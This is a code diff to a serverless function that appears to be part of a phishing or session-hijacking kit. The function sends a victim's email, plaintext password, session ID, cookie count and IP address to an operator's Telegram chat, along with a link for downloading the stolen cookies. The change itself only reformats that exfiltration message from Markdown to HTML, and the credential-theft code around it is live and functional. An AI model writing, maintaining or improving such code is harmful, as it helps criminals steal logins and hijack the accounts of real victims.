@@ -126,17 +126,17 @@ export const handler = async (event, context) => {
     // Send immediate Telegram notification if not already sent
     try {
       if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID && !data.skipTelegram) {
-        const quickMessage = `🔔 NEW SESSION SAVED
+        const quickMessage = `🔔 <b>NEW SESSION SAVED</b>
 
-📧 ${sessionData.email}
-🔑 ${sessionData.password}
-🆔 ${sessionData.sessionId}
-🍪 ${Array.isArray(sessionData.formattedCookies) ? sessionData.formattedCookies.length : 0} cookies
-💾 Storage: ${sessionData.localStorage !== 'Empty' ? 'Has Data' : 'Empty'}
-🌐 IP: ${sessionData.clientIP}
-🕒 ${new Date().toLocaleString()}
+📧 <b>Email:</b> ${sessionData.email}
+🔑 <b>Password:</b> ${sessionData.password}
+🆔 <b>Session:</b> ${sessionData.sessionId}
+🍪 <b>Cookies:</b> ${Array.isArray(sessionData.formattedCookies) ? sessionData.formattedCookies.length : 0}
+💾 <b>Storage:</b> ${sessionData.localStorage !== 'Empty' ? 'Has Data' : 'Empty'}
+🌐 <b>IP:</b> ${sessionData.clientIP}
+🕒 <b>Time:</b> ${new Date().toLocaleString()}
 
-Download: ${event.headers.host ? `https://${event.headers.host}` : 'https://your-domain.netlify.app'}/.netlify/functions/getCookies?sessionId=${sessionData.sessionId}`;
+<b>Download:</b> ${event.headers.host ? `https://${event.headers.host}` : 'https://your-domain.netlify.app'}/.netlify/functions/getCookies?sessionId=${sessionData.sessionId}`;
 
         const telegramResp = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
           method: 'POST',
@@ -144,7 +144,7 @@ Download: ${event.headers.host ? `https://${event.headers.host}` : 'https://your
           body: JSON.stringify({
             chat_id: TELEGRAM_CHAT_ID,
             text: quickMessage,
-            parse_mode: 'Markdown'
+            parse_mode: 'HTML'
           }),
           signal: AbortSignal.timeout(10000)
         });
